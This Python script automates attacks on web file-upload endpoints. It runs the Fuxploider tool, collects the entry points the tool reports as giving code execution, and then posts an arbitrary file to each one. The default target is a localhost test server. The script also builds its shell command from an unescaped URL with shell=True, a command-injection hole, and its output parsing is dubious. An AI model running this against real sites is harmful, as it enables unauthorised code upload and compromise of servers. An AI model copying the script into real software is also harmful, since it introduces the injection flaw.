import subprocess
import requests

def run_fuxploider(url):
    try:
        command = f"python3 fuxploider.py -u {url} --detectAllEntryPoints"
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except Exception as e:
        print(f"Error running Fuxploider: {e}")
        return None

def parse_entry_points(output):
    entry_points = []
    if output:
        lines = output.split('\n')
        for line in lines:
            if "Code execution obtained" in line:
                parts = line.split("'")
                entry_points.append(parts[-2])
    return entry_points

def attempt_file_upload(entry_points, file_path):
    for entry_point in entry_points:
        try:
            files = {'file': open(file_path, 'rb')}
            response = requests.post(entry_point, files=files)
            if response.status_code == 200:
                print(f"Successfully uploaded file to: {entry_point}")
            else:
                print(f"Failed to upload file to: {entry_point}")
        except Exception as e:
            print(f"Error uploading file to {entry_point}: {e}")

def main():
    target_url = "http://localhost:1337/upload"
    
    file_to_upload = "path/to/your/file.txt"

    print("Running Fuxploider...")
    fuxploider_output = run_fuxploider(target_url)
    if fuxploider_output:
        print("Fuxploider scan completed.")
        
        print("Parsing entry points...")
        entry_points = parse_entry_points(fuxploider_output)
        if entry_points:
            print("Entry points identified:")
            for entry_point in entry_points:
                print(entry_point)
            
            print("Attempting file upload...")
            attempt_file_upload(entry_points, file_to_upload)
        else:
            print("No entry points found.")
    else:
        print("Fuxploider scan failed.")

if __name__ == "__main__":
    main()
